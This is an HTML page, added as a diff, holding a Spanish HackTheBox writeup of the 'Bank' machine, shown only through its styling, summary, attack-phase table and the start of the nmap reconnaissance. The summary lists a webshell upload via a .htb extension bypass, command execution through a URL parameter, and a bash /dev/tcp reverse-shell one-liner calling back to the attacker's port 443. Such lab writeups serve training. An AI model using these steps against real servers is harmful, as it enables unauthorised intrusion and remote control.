@@ -1,0 +1,1616 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Bank — HackTheBox Writeup | Brandeiks</title>
+  <meta name="description" content="Writeup de la máquina Bank de HackTheBox — Dificultad: Fácil. DNS local (/etc/hosts) → wfuzz directory discovery → balance-transfer leak → credenciales en texto plano → File Upload bypass (.htb) → RCE → SUID /var/htb/bin/emergency → root.">
+  <meta name="author" content="Brandon Zevallos Pastrana">
+  <link rel="icon" type="image/svg+xml" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 100 100'%3E%3Crect width='100' height='100' fill='%2300ff88' rx='20'/%3E%3Ctext x='50%25' y='50%25' text-anchor='middle' dy='.35em' font-size='70' font-weight='bold' fill='%23050a0e' font-family='monospace'%3EB%3C/text%3E%3C/svg%3E">
+  <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@300;400;600;700&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet"/>
+  <style>
+    :root {
+      --bg:        #050a0e;
+      --bg2:       #080f14;
+      --bg3:       #0a1520;
+      --green:     #00ff88;
+      --cyan:      #00e5ff;
+      --red:       #ff2d55;
+      --yellow:    #ffd700;
+      --orange:    #ff8c00;
+      --purple:    #bf5fff;
+      --dim:       #1a2a2e;
+      --text:      #c8d8e0;
+      --text-dim:  #4a6a74;
+      --font-mono: 'Share Tech Mono', monospace;
+      --font-main: 'Rajdhani', sans-serif;
+      --font-disp: 'Orbitron', sans-serif;
+    }
+    * { margin: 0; padding: 0; box-sizing: border-box; }
+    html { scroll-behavior: smooth; }
+    body {
+      background: var(--bg);
+      color: var(--text);
+      font-family: var(--font-main);
+      overflow-x: hidden;
+      cursor: none;
+    }
+    body::before {
+      content: '';
+      position: fixed; inset: 0;
+      background: repeating-linear-gradient(
+        0deg, transparent, transparent 2px,
+        rgba(0,255,136,0.012) 2px, rgba(0,255,136,0.012) 4px
+      );
+      pointer-events: none; z-index: 1000;
+    }
+
+    /* CURSOR */
+    a, button { cursor: none; }
+    .cursor {
+      position: fixed; width: 10px; height: 10px;
+      background: var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9999;
+      transform: translate(-50%,-50%);
+      box-shadow: 0 0 12px var(--green); opacity: 0;
+    }
+    .cursor-ring {
+      position: fixed; width: 36px; height: 36px;
+      border: 1px solid var(--green); border-radius: 50%;
+      pointer-events: none; z-index: 9998;
+      transform: translate(-50%,-50%); opacity: 0;
+      transition: all 0.12s ease;
+    }
+
+    /* NAV */
+    nav {
+      position: fixed; top: 0; left: 0; right: 0; z-index: 500;
+      display: flex; justify-content: space-between; align-items: center;
+      padding: 1.2rem 4rem;
+      background: rgba(5,10,14,0.92); backdrop-filter: blur(10px);
+      border-bottom: 1px solid rgba(0,255,136,0.08);
+    }
+    .nav-logo { font-family: var(--font-disp); font-size: 1rem; color: var(--green); letter-spacing: 4px; text-decoration: none; }
+    .nav-back { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); text-decoration: none; letter-spacing: 2px; transition: color 0.3s; }
+    .nav-back::before { content: '← '; }
+    .nav-back:hover { color: var(--green); }
+
+    /* HERO */
+    .writeup-hero {
+      min-height: 42vh; display: flex; align-items: flex-end;
+      padding: 8rem 4rem 3rem; position: relative; overflow: hidden;
+      border-bottom: 1px solid var(--dim);
+    }
+    .hero-grid {
+      position: absolute; inset: 0;
+      background-image:
+        linear-gradient(rgba(0,255,136,0.03) 1px, transparent 1px),
+        linear-gradient(90deg, rgba(0,255,136,0.03) 1px, transparent 1px);
+      background-size: 60px 60px;
+    }
+    .hero-glow {
+      position: absolute; width: 600px; height: 400px;
+      background: radial-gradient(ellipse, rgba(0,229,255,0.07) 0%, transparent 70%);
+      top: 0; left: 0; pointer-events: none;
+    }
+    .writeup-hero-content { position: relative; z-index: 2; max-width: 900px; }
+    .breadcrumb { font-family: var(--font-mono); font-size: 0.72rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 1.2rem; }
+    .breadcrumb a { color: var(--text-dim); text-decoration: none; transition: color 0.2s; }
+    .breadcrumb a:hover { color: var(--green); }
+    .breadcrumb span { color: var(--green); }
+    .writeup-title { font-family: var(--font-disp); font-size: clamp(2.5rem, 6vw, 4.5rem); font-weight: 900; letter-spacing: 2px; line-height: 1.1; }
+    .writeup-title span { color: var(--cyan); }
+    .writeup-subtitle { font-family: var(--font-mono); font-size: 0.85rem; color: var(--text-dim); margin-top: 0.8rem; letter-spacing: 1px; }
+    .writeup-meta { display: flex; flex-wrap: wrap; gap: 1rem; align-items: center; margin-top: 1.8rem; }
+    .meta-badge { font-family: var(--font-mono); font-size: 0.68rem; letter-spacing: 2px; padding: 0.3rem 0.8rem; border: 1px solid; }
+    .badge-facil   { color: #00ffcc;  border-color: rgba(0,255,204,0.4);  background: rgba(0,255,204,0.05); }
+    .badge-htb     { color: var(--green); border-color: rgba(0,255,136,0.4);  background: rgba(0,255,136,0.05); }
+    .badge-linux   { color: var(--yellow); border-color: rgba(255,215,0,0.3);  background: rgba(255,215,0,0.05); }
+    .badge-upload  { color: var(--orange); border-color: rgba(255,140,0,0.4);   background: rgba(255,140,0,0.05); }
+    .badge-rce     { color: var(--red);    border-color: rgba(255,45,85,0.4);   background: rgba(255,45,85,0.05); }
+    .badge-suid    { color: var(--purple); border-color: rgba(191,95,255,0.35); background: rgba(191,95,255,0.05); }
+    .badge-dns     { color: var(--cyan);   border-color: rgba(0,229,255,0.3);   background: rgba(0,229,255,0.05); }
+    .badge-wfuzz   { color: var(--orange); border-color: rgba(255,140,0,0.3);   background: rgba(255,140,0,0.05); }
+    .meta-date { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+
+    /* LAYOUT */
+    .writeup-layout {
+      display: grid; grid-template-columns: 1fr 240px;
+      gap: 3rem; max-width: 1300px; margin: 0 auto; padding: 4rem;
+    }
+
+    /* SIDEBAR */
+    .sidebar { position: sticky; top: 5rem; height: fit-content; order: 2; }
+    .sidebar-box { border: 1px solid var(--dim); padding: 1.5rem; background: var(--bg2); margin-bottom: 1.5rem; }
+    .sidebar-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--green); letter-spacing: 3px; margin-bottom: 1.2rem; }
+    .toc-list { list-style: none; display: flex; flex-direction: column; gap: 0.4rem; }
+    .toc-list a {
+      font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim);
+      text-decoration: none; letter-spacing: 1px; transition: all 0.2s;
+      display: block; padding: 0.25rem 0.8rem;
+      border-left: 2px solid transparent;
+    }
+    .toc-list a:hover { color: var(--green); border-left-color: var(--green); }
+    .toc-list a.active { color: var(--green); border-left-color: var(--green); opacity: 1; }
+    .info-row { display: flex; justify-content: space-between; align-items: center; margin-bottom: 0.8rem; }
+    .info-label { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); letter-spacing: 1px; }
+    .info-val { font-family: var(--font-mono); font-size: 0.72rem; }
+    .val-green  { color: var(--green); }
+    .val-cyan   { color: var(--cyan); }
+    .val-yellow { color: var(--yellow); }
+    .val-red    { color: var(--red); }
+    .val-facil  { color: #00ffcc; }
+
+    /* ATTACK PATH */
+    .attack-path { display: flex; flex-direction: column; gap: 0; }
+    .ap-item { display: flex; align-items: flex-start; gap: 0.8rem; padding: 0.5rem 0; }
+    .ap-dot { width: 8px; height: 8px; background: var(--green); border-radius: 50%; margin-top: 4px; flex-shrink: 0; box-shadow: 0 0 6px var(--green); }
+    .ap-line { width: 1px; height: 16px; background: rgba(0,255,136,0.2); margin: 0 3.5px; }
+    .ap-text { font-family: var(--font-mono); font-size: 0.65rem; color: var(--text-dim); line-height: 1.5; }
+    .ap-text span { color: var(--cyan); }
+
+    /* CONTENT */
+    .writeup-content { min-width: 0; order: 1; }
+
+    /* PROGRESS BAR */
+    .progress-container { position: fixed; top: 0; left: 0; width: 100%; height: 3px; background: transparent; z-index: 1001; }
+    .progress-bar { height: 100%; background: var(--green); width: 0%; transition: width 0.15s ease; box-shadow: 0 0 8px var(--green); }
+
+    /* SKIP LINK */
+    .skip-link { position: absolute; top: -40px; left: 0; background: var(--green); color: var(--bg); padding: 8px 16px; z-index: 10000; text-decoration: none; font-family: var(--font-mono); font-size: 0.8rem; transition: top 0.2s; }
+    .skip-link:focus { top: 0; }
+
+    /* COPY BUTTON */
+    .copy-btn {
+      position: absolute; top: 0.5rem; right: 4.5rem;
+      background: var(--dim); border: 1px solid rgba(0,255,136,0.3);
+      color: var(--text-dim); font-family: var(--font-mono);
+      font-size: 0.62rem; padding: 0.15rem 0.5rem; letter-spacing: 1px;
+      cursor: none; opacity: 0; transition: opacity 0.2s, background 0.2s, color 0.2s;
+      z-index: 10; white-space: nowrap;
+    }
+    .cmd-block:hover .copy-btn { opacity: 1; }
+    .copy-btn:hover { background: var(--green); color: var(--bg); border-color: var(--green); }
+    .copy-btn.copied { background: var(--green); color: var(--bg); border-color: var(--green); opacity: 1; }
+
+    /* TOAST */
+    .toast {
+      position: fixed; bottom: 24px; right: 24px;
+      background: var(--green); color: #000;
+      padding: 0.7rem 1.4rem; font-family: var(--font-mono);
+      font-size: 0.75rem; letter-spacing: 2px; font-weight: 600;
+      opacity: 0; transform: translateY(8px);
+      transition: opacity 0.25s, transform 0.25s;
+      pointer-events: none; z-index: 10000;
+    }
+    .toast.show { opacity: 1; transform: translateY(0); }
+
+    /* SECTIONS */
+    .section { margin-bottom: 4rem; opacity: 0; transform: translateY(20px); transition: opacity 0.5s ease, transform 0.5s ease; }
+    .section.visible { opacity: 1; transform: translateY(0); }
+    .section-label { font-family: var(--font-mono); font-size: 0.68rem; color: var(--green); letter-spacing: 4px; margin-bottom: 0.5rem; }
+    .section-title { font-family: var(--font-disp); font-size: 1.5rem; font-weight: 700; letter-spacing: 2px; margin-bottom: 0.6rem; }
+    .section-line { width: 40px; height: 2px; background: var(--green); margin-bottom: 2rem; }
+
+    /* PROSE */
+    .prose p { font-size: 1.05rem; line-height: 1.9; color: var(--text-dim); margin-bottom: 1rem; }
+    .prose p strong { color: var(--text); }
+    .prose p .hl       { color: var(--green); font-weight: bold; }
+    .prose p .hl-cyan  { color: var(--cyan); }
+    .prose p .hl-red   { color: var(--red); }
+    .prose p .hl-yel   { color: var(--yellow); }
+    .prose p .hl-pur   { color: var(--purple); }
+    .prose p .hl-ora   { color: var(--orange); }
+
+    /* STEP */
+    .step-marker { display: flex; align-items: center; gap: 1rem; margin-bottom: 1.2rem; margin-top: 2.5rem; }
+    .step-num { font-family: var(--font-disp); font-size: 0.65rem; color: var(--bg); background: var(--green); width: 26px; height: 26px; display: flex; align-items: center; justify-content: center; flex-shrink: 0; font-weight: 900; }
+    .step-title { font-family: var(--font-mono); font-size: 0.8rem; color: var(--green); letter-spacing: 2px; }
+
+    /* CMD BLOCK */
+    .cmd-block {
+      background: var(--bg3); border: 1px solid rgba(0,229,255,0.15);
+      border-left: 3px solid var(--cyan); padding: 1rem 1.2rem;
+      margin: 1rem 0; font-family: var(--font-mono); font-size: 0.82rem;
+      overflow-x: auto; position: relative; line-height: 1.8;
+    }
+    .cmd-block .cmd-label { position: absolute; top: 0.5rem; right: 0.8rem; font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; }
+    .cmd-block .prompt { color: var(--green); user-select: none; }
+    .cmd-block .prompt-root { color: var(--red); user-select: none; }
+    .cmd-block .cmd    { color: var(--text); }
+    .cmd-block .flag   { color: var(--cyan); }
+    .cmd-block .arg    { color: var(--yellow); }
+    .cmd-block .comment { color: var(--text-dim); font-size: 0.75rem; }
+
+    /* OUTPUT */
+    .output-block {
+      background: #020608; border: 1px solid var(--dim);
+      padding: 1rem 1.2rem; margin: 0.5rem 0 1.5rem;
+      font-family: var(--font-mono); font-size: 0.77rem;
+      line-height: 1.9; color: var(--text-dim); overflow-x: auto;
+    }
+    .output-block .o-green  { color: var(--green); }
+    .output-block .o-cyan   { color: var(--cyan); }
+    .output-block .o-red    { color: var(--red); }
+    .output-block .o-yellow { color: var(--yellow); }
+    .output-block .o-white  { color: var(--text); }
+    .output-block .o-purple { color: var(--purple); }
+    .output-block .o-orange { color: var(--orange); }
+
+    /* INFO BOXES */
+    .info-box { border: 1px solid rgba(0,229,255,0.2); background: rgba(0,229,255,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .info-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--cyan); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .info-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .info-box p strong { color: var(--cyan); }
+
+    .warn-box { border: 1px solid rgba(255,140,0,0.25); background: rgba(255,140,0,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .warn-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--orange); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .warn-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .warn-box p strong { color: var(--orange); }
+
+    .vuln-box { border: 1px solid rgba(255,45,85,0.3); background: rgba(255,45,85,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; }
+    .vuln-box-title { font-family: var(--font-mono); font-size: 0.65rem; color: var(--red); letter-spacing: 3px; margin-bottom: 0.6rem; }
+    .vuln-box p { font-family: var(--font-mono); font-size: 0.78rem; color: var(--text-dim); line-height: 1.7; }
+    .vuln-box p strong { color: var(--red); }
+
+    /* CRED BOX */
+    .cred-box { border: 1px solid rgba(0,255,136,0.25); background: rgba(0,255,136,0.04); padding: 1.2rem 1.5rem; margin: 1.2rem 0; display: flex; gap: 2rem; flex-wrap: wrap; }
+    .cred-item .cred-label { font-family: var(--font-mono); font-size: 0.6rem; color: var(--text-dim); letter-spacing: 2px; margin-bottom: 0.3rem; }
+    .cred-item .cred-val   { font-family: var(--font-mono); font-size: 0.95rem; color: var(--green); }
+
+    /* VULN TABLE */
+    .vuln-table { width: 100%; border-collapse: collapse; margin: 1.5rem 0; }
+    .vuln-table th, .vuln-table td { font-family: var(--font-mono); font-size: 0.72rem; padding: 0.8rem 1rem; text-align: left; border-bottom: 1px solid var(--dim); }
+    .vuln-table th { color: var(--cyan); letter-spacing: 2px; border-bottom-color: rgba(0,229,255,0.2); }
+    .vuln-table td { color: var(--text-dim); }
+    .vuln-table td:first-child { color: var(--green); }
+
+    /* DIVIDER */
+    hr.divider { border: none; height: 1px; background: linear-gradient(90deg, rgba(0,255,136,0.3), transparent); margin: 3rem 0; }
+
+    /* CMD REF */
+    .cmd-ref-grid { display: grid; grid-template-columns: 1fr 1fr; gap: 1.2rem; margin-top: 1.5rem; }
+    .cmd-ref-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.5rem; transition: border-color 0.3s; }
+    .cmd-ref-card:hover { border-color: rgba(0,229,255,0.25); }
+    .cmd-ref-name { font-family: var(--font-mono); font-size: 0.9rem; color: var(--cyan); margin-bottom: 0.5rem; letter-spacing: 1px; }
+    .cmd-ref-syntax { font-family: var(--font-mono); font-size: 0.72rem; color: var(--green); background: var(--bg3); padding: 0.4rem 0.7rem; margin-bottom: 0.8rem; display: inline-block; }
+    .cmd-ref-desc { font-size: 0.92rem; color: var(--text-dim); line-height: 1.7; margin-bottom: 0.8rem; }
+    .cmd-ref-flags { list-style: none; display: flex; flex-direction: column; gap: 0.3rem; }
+    .cmd-ref-flags li { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); }
+    .cmd-ref-flags li span { color: var(--yellow); }
+
+    /* GLOSARIO */
+    .glosario-grid { display: grid; grid-template-columns: 1fr; gap: 1rem; margin-top: 1.5rem; }
+    .glos-card { border: 1px solid var(--dim); background: var(--bg2); padding: 1.4rem 1.5rem; transition: border-color 0.3s; }
+    .glos-card:hover { border-color: rgba(0,229,255,0.2); }
+    .glos-term { font-family: var(--font-mono); font-size: 0.88rem; color: var(--cyan); margin-bottom: 0.4rem; letter-spacing: 1px; }
+    .glos-def { font-size: 0.95rem; color: var(--text-dim); line-height: 1.75; }
+    .glos-def strong { color: var(--green); }
+    .glos-def code { color: var(--yellow); font-family: var(--font-mono); font-size: 0.85em; }
+
+    /* FOOTER */
+    footer { padding: 2rem 4rem; border-top: 1px solid var(--dim); display: flex; justify-content: space-between; align-items: center; margin-top: 4rem; }
+    footer p { font-family: var(--font-mono); font-size: 0.7rem; color: var(--text-dim); letter-spacing: 1px; }
+    footer span { color: var(--green); }
+
+    @media (max-width: 960px) {
+      nav, .writeup-hero, footer { padding-left: 1.5rem; padding-right: 1.5rem; }
+      .writeup-layout { grid-template-columns: 1fr; padding: 2rem 1.5rem; }
+      .sidebar { position: static; }
+      .cmd-ref-grid { grid-template-columns: 1fr; }
+      body, a, button { cursor: auto; }
+      .cursor, .cursor-ring { display: none; }
+    }
+  </style>
+</head>
+<body>
+
+<a href="#main-content" class="skip-link">Saltar al contenido principal</a>
+<div class="progress-container"><div class="progress-bar" id="readingProgress"></div></div>
+<div class="cursor" id="cursor"></div>
+<div class="cursor-ring" id="cursorRing"></div>
+
+<nav>
+  <a href="../../index.html" class="nav-logo">BRANDEIKS_SEC</a>
+  <a href="../../index.html" class="nav-back">volver al portafolio</a>
+</nav>
+
+<!-- HERO -->
+<div class="writeup-hero">
+  <div class="hero-grid"></div>
+  <div class="hero-glow"></div>
+  <div class="writeup-hero-content">
+    <p class="breadcrumb">
+      <a href="../../index.html">brandeiks</a> /
+      <a href="../">writeups</a> /
+      <a href="../../writeups/hackthebox/">hackthebox</a> /
+      <span>bank</span>
+    </p>
+    <h1 class="writeup-title"><span style="color:var(--green)">Bank</span></h1>
+    <p class="writeup-subtitle">HackTheBox — Linux · /etc/hosts DNS → nmap → wfuzz → balance-transfer leak → File Upload .htb bypass → RCE → SUID emergency LPE</p>
+    <div class="writeup-meta">
+      <span class="meta-badge badge-facil">● FÁCIL</span>
+      <span class="meta-badge badge-htb">HACKTHEBOX</span>
+      <span class="meta-badge badge-linux">LINUX</span>
+      <span class="meta-badge badge-dns">DNS LOCAL</span>
+      <span class="meta-badge badge-wfuzz">WFUZZ</span>
+      <span class="meta-badge badge-upload">FILE UPLOAD</span>
+      <span class="meta-badge badge-rce">RCE</span>
+      <span class="meta-badge badge-suid">SUID · LPE</span>
+      <span class="meta-date">📅 Abril 2026 · By Brandeiks</span>
+    </div>
+  </div>
+</div>
+
+<!-- LAYOUT -->
+<div class="writeup-layout">
+
+  <!-- SIDEBAR -->
+  <aside class="sidebar">
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ÍNDICE</p>
+      <ul class="toc-list">
+        <li><a href="#resumen">01 · Resumen</a></li>
+        <li><a href="#reconocimiento">02 · Reconocimiento</a></li>
+        <li><a href="#dns">03 · Configuración DNS local</a></li>
+        <li><a href="#enumeracion">04 · Enumeración Web · wfuzz</a></li>
+        <li><a href="#leak">05 · Balance-Transfer · Leak</a></li>
+        <li><a href="#acceso">06 · Acceso al Panel</a></li>
+        <li><a href="#upload">07 · File Upload · .htb Bypass</a></li>
+        <li><a href="#rce">08 · RCE · Reverse Shell</a></li>
+        <li><a href="#privesc">09 · Privesc · SUID emergency</a></li>
+        <li><a href="#flags">10 · Flags</a></li>
+        <li><a href="#referencia">11 · Referencia de Comandos</a></li>
+        <li><a href="#glosario">12 · Glosario</a></li>
+      </ul>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// INFO</p>
+      <div class="info-row"><span class="info-label">Plataforma</span><span class="info-val val-green">HackTheBox</span></div>
+      <div class="info-row"><span class="info-label">OS</span><span class="info-val val-yellow">Linux (Ubuntu)</span></div>
+      <div class="info-row"><span class="info-label">Dificultad</span><span class="info-val val-facil">Fácil</span></div>
+      <div class="info-row"><span class="info-label">IP Target</span><span class="info-val" style="color:var(--text)">10.129.3.73</span></div>
+      <div class="info-row"><span class="info-label">Web</span><span class="info-val val-cyan">Apache 2.4.7</span></div>
+      <div class="info-row"><span class="info-label">Dominio</span><span class="info-val val-cyan">bank.htb</span></div>
+      <div class="info-row"><span class="info-label">Estado</span><span class="info-val val-green">● Pwned</span></div>
+    </div>
+    <div class="sidebar-box">
+      <p class="sidebar-title">// ATTACK PATH</p>
+      <div class="attack-path">
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>nmap</span> → puertos 22/53/80</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>/etc/hosts</span> → bank.htb</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>wfuzz</span> → /balance-transfer</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>curl + grep</span> → ERR ENCRYPT FAILED</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Credenciales</span> → chris@bank.htb</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>Burp Suite</span> → .htb bypass</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>shell.htb</span> → RCE www-data</div></div>
+        <div class="ap-line"></div>
+        <div class="ap-item"><div class="ap-dot"></div><div class="ap-text"><span>SUID emergency</span> → root</div></div>
+      </div>
+    </div>
+  </aside>
+
+  <!-- CONTENT -->
+  <main class="writeup-content" id="main-content">
+
+    <!-- ===================== 01 RESUMEN ===================== -->
+    <div class="section" id="resumen">
+      <p class="section-label">// 01</p>
+      <h2 class="section-title">Resumen</h2>
+      <div class="section-line"></div>
+      <div class="prose">
+        <p>
+          <strong>Bank</strong> es una máquina de dificultad <span class="hl">fácil</span>
+          de la plataforma <span class="hl-cyan">HackTheBox</span>. Simula un servidor bancario web
+          que requiere configuración manual de DNS para acceder al dominio
+          <span class="hl-cyan">bank.htb</span>. El punto de entrada no es trivial: la
+          enumeración web mediante <span class="hl-yel">wfuzz</span> revela el directorio
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/balance-transfer</code>,
+          que contiene archivos de transacciones cifradas; sin embargo, uno de ellos falló al
+          cifrarse (<span class="hl-red">ERR ENCRYPT FAILED</span>) y expone las
+          <strong>credenciales en texto plano</strong> del usuario administrador.
+        </p>
+        <p>
+          Con acceso al panel, se detecta que la sección <em>Support</em> permite subir archivos.
+          El servidor rechaza PHP directamente, pero al revisar el código fuente HTML con
+          <span class="hl-cyan">Burp Suite</span> se descubre un comentario de depuración
+          (<span class="hl-ora">[DEBUG]</span>) que indica que la extensión
+          <code style="color:var(--yellow);font-family:var(--font-mono)">.htb</code> es tratada
+          como PHP. Subimos una webshell con esa extensión, obtenemos
+          <span class="hl-red">RCE</span> como <code style="color:var(--yellow);font-family:var(--font-mono)">www-data</code>
+          y establecemos una reverse shell.
+        </p>
+        <p>
+          Para la escalada de privilegios identificamos el binario
+          <code style="color:var(--yellow);font-family:var(--font-mono)">/var/htb/bin/emergency</code>
+          con el bit <span class="hl-pur">SUID</span> activado y propiedad de
+          <code style="color:var(--yellow);font-family:var(--font-mono)">root</code>. Al ejecutarlo
+          obtenemos una shell como <span class="hl-red">root</span> directamente, sin necesidad de
+          exploits adicionales.
+        </p>
+      </div>
+
+      <table class="vuln-table">
+        <thead>
+          <tr><th>Fase</th><th>Técnica / Herramienta</th><th>Resultado</th></tr>
+        </thead>
+        <tbody>
+          <tr><td>Reconocimiento</td><td>nmap -p- -sV -sC -sS -n -Pn --min-rate=5000</td><td>Puertos 22 (SSH), 53 (DNS), 80 (HTTP) abiertos</td></tr>
+          <tr><td>DNS local</td><td>sudo nano /etc/hosts → 10.129.3.73 bank.htb</td><td>Acceso a bank.htb/login.php</td></tr>
+          <tr><td>Enum. Web</td><td>wfuzz -c -hc=404 -t 200 -w big.txt http://bank.htb/FUZZ.php</td><td>/balance-transfer, /support, /uploads</td></tr>
+          <tr><td>Leak</td><td>curl + awk + grep → archivo con ERR ENCRYPT FAILED</td><td>chris@bank.htb : !!##HTBB4nkP4ssw0rd!##</td></tr>
+          <tr><td>Acceso</td><td>Login en bank.htb/login.php</td><td>Panel bancario autenticado como Christos Christopoulos</td></tr>
+          <tr><td>File Upload</td><td>Burp Suite → cambiar extensión .php → .htb</td><td>shell.htb subida a /uploads/</td></tr>
+          <tr><td>RCE</td><td>bank.htb/uploads/shell.htb?cmd=whoami</td><td>www-data</td></tr>
+          <tr><td>Reverse Shell</td><td>bash -i &gt;&amp; /dev/tcp/IP/443 0&gt;&amp;1 (URL-encoded)</td><td>Shell interactiva como www-data</td></tr>
+          <tr><td>Privesc</td><td>find / -perm -4000 -type f → /var/htb/bin/emergency</td><td>SUID root → ejecución como root</td></tr>
+          <tr><td>Root</td><td>/var/htb/bin/emergency</td><td>root.txt obtenido</td></tr>
+        </tbody>
+      </table>
+    </div>
+
+    <hr class="divider">
+
+    <!-- ===================== 02 RECONOCIMIENTO ===================== -->
+    <div class="section" id="reconocimiento">
+      <p class="section-label">// 02</p>
+      <h2 class="section-title">Reconocimiento</h2>
+      <div class="section-line"></div>
+
+      <div class="step-marker">
+        <div class="step-num">1</div>
+        <span class="step-title">ESCANEO DE PUERTOS CON NMAP</span>
+      </div>
+      <div class="prose">
+        <p>
+          El primer paso es identificar qué servicios están corriendo en la máquina objetivo.
+          Utilizamos <span class="hl-cyan">nmap</span> con un escaneo completo de los
+          <strong>65535 puertos TCP</strong>. Cada flag cumple una función específica que
+          optimiza velocidad y cobertura:
+        </p>
+        <p>
+          <span class="hl-cyan">-p-</span> indica a nmap que escanee
+          <strong>todos los puertos</strong> (del 1 al 65535), no solo los 1000 más comunes.
+          <span class="hl-cyan">-sV</span> activa la <strong>detección de versiones</strong>:
+          nmap intenta identificar qué software y versión exacta corre en cada puerto abierto,
+          enviando sondas específicas. <span class="hl-cyan">-sC</span> ejecuta los
+          <strong>scripts NSE (Nmap Scripting Engine) por defecto</strong>, que realizan
+          enumeraciones adicionales como extracción de certificados SSL, headers HTTP, llaves
+          SSH, etc. <span class="hl-cyan">-sS</span> es el <strong>SYN scan sigiloso</strong>
+          (también llamado half-open scan): envía un SYN, recibe SYN-ACK si el puerto está
+          abierto y envía RST en vez de completar el handshake, dejando menos rastros en logs.
+          <span class="hl-cyan">-n</span> desactiva la <strong>resolución DNS inversa</strong>,
+          acelerando el escaneo. <span class="hl-cyan">-Pn</span> desactiva el
+          <strong>ping previo (host discovery)</strong>, tratando el host como activo sin
+          importar si responde a ICMP — útil cuando el firewall bloquea pings.
+          <span class="hl-cyan">--min-rate=5000</span> fuerza a nmap a enviar al menos
+          <strong>5000 paquetes por segundo</strong>, reduciendo drásticamente el tiempo del
+          escaneo.
+        </p>
+      </div>
+
+      <div class="cmd-block" data-cmd="nmap -p- -sV -sC -sS -n -Pn --min-rate=5000 10.129.3.73">
+        <button class="copy-btn" onclick="copyCmd(this)">COPY</button>
+        <span class="cmd-label">RECONOCIMIENTO</span>
+        <div><span class="prompt">$ </span><span class="cmd">nmap <span class="flag">-p-</span> <span class="flag">-sV</span> <span class="flag">-sC</span> <span class="flag">-sS</span> <span class="flag">-n</span> <span class="flag">-Pn</span> <span class="flag">--min-rate=5000</span> <span class="arg">10.129.3.73</span></span></div>
+      </div>
+
+      <div class="output-block">
+        <div>Starting Nmap 7.99 ( https://nmap.org ) at 2026-04-24 01:07 -0400</div>
+        <div>Warning: 10.129.3.73 giving up on port because retransmission cap hit (10).</div>
+        <div>Nmap scan report for <span class="o-cyan">10.129.3.73</span></div>
+        <div>Host is up (0.88s latency).</div>
+        <div>Not shown: 65186 closed tcp ports (reset), 346 filtered tcp ports (no-response)</div>
+        <div>PORT&nbsp;&nbsp;&nbsp;&nbsp;STATE SERVICE&nbsp;VERSION</div>
+        <div><span class="o-green">22/tcp</span>  open  ssh&nbsp;&nbsp;&nbsp;&nbsp; <span class="o-cyan">OpenSSH 6.6.1p1</span> Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)</div>
+        <div>| ssh-hostkey:</div>
+        <div>|&nbsp;&nbsp; 1024 08:ee:d0:30:d5:45:e4:59:db:4d:54:a8:dc:5c:ef:15 (DSA)</div>
+        <div>|&nbsp;&nbsp; 2048 b8:e0:15:48:2d:0d:f0:f1:73:33:b7:81:64:08:4a:91 (RSA)</div>
+        <div>|&nbsp;&nbsp; 256 a0:4c:94:d1:7b:6e:a8:fd:07:fe:11:eb:88:d5:16:65 (ECDSA)</div>
+        <div>|_  256 2d:79:44:30:c8:bb:5e:8f:07:cf:5b:72:ef:a1:6d:67 (ED25519)</div>
+        <div><span class="o-green">53/tcp</span>  open  domain  <span class="o-cyan">ISC BIND 9.9.5-3ubuntu0.14</span> (Ubuntu Linux)</div>
+        <div>| dns-nsid:</div>
+        <div>|_  bind.version: 9.9.5-3ubuntu0.14-Ubuntu</div>
+        <div><span class="o-green">80/tcp</span>  open  http&nbsp;&nbsp;&nbsp; <span class="o-cyan">Apache httpd 2.4.7</span> ((Ubuntu))</div>
+        <div>|_http-server-header: Apache/2.4.7 (Ubuntu)</div>
+        <div>|_http-title: <span class="o-yellow">Apache2 Ubuntu Default Page: It works</span></div>
+        <div>Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</div>
+        <div>&nbsp;</div>
+        <div>Nmap done: 1 IP address (1 host up) scanned in 89.38 seconds</div>
+      </div>
+
+      <div class="info-box">
+        <p class="info-box-title">// ANÁLISIS DE RESULTADOS</p>
+        <p>
+          Se encontraron <strong>3 puertos abiertos</strong>:
